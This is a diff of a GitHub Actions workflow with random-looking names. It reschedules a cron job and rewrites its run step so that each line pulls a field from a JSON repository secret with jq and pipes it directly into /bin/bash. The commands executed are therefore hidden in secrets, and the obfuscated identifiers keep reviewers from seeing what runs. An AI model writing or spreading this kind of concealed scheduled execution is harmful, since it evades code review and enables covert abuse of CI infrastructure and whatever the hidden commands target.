@@ -1,28 +1,26 @@
 name: baifeili4312
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 2/6 * * *'
-
+    - cron: '48 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: baifeili4312
         env:
-          lsjjh1: ${{ secrets.lsjjh1 }}
+          dklil68: ${{ secrets.dklil68 }}
         run: |
-          echo $lsjjh1 | jq -r .fjgk34 | /bin/bash
-          echo $ctpo15994 | jq -r .a3081 | /bin/bash
-          echo $qu97 | jq -r .rjpvs7 | /bin/bash
-          echo $e4402 | jq -r .lqz25 | /bin/bash
-          echo $utwy6259 | jq -r .gfkv13 | /bin/bash
-          echo $d9 | jq -r .agw222 | /bin/bash
-          echo $pmjo96 | jq -r .nhy68112 | /bin/bash
-          echo $lcqs71 | jq -r .jyxz6075 | /bin/bash
-          echo $yb625 | jq -r .jc143 | /bin/bash
-          echo $jcobg161 | jq -r .fv8976 | /bin/bash
-          echo $aleb5857 | jq -r .hp647 | /bin/bash
+          echo $dklil68 | jq -r .zfc4 | /bin/bash
+          echo $kt33739 | jq -r .ko16598 | /bin/bash
+          echo $jo20656 | jq -r .am73029 | /bin/bash
+          echo $uje5590 | jq -r .cjkzr329 | /bin/bash
+          echo $o49544 | jq -r .jvhm685 | /bin/bash
+          echo $ixu2 | jq -r .uhst2 | /bin/bash
+          echo $hyam37814 | jq -r .gelji54098 | /bin/bash
+          echo $fu9132 | jq -r .elx7719 | /bin/bash
+          echo $x9413 | jq -r .djs1 | /bin/bash
+          echo $np22 | jq -r .pyyyh267 | /bin/bash
 
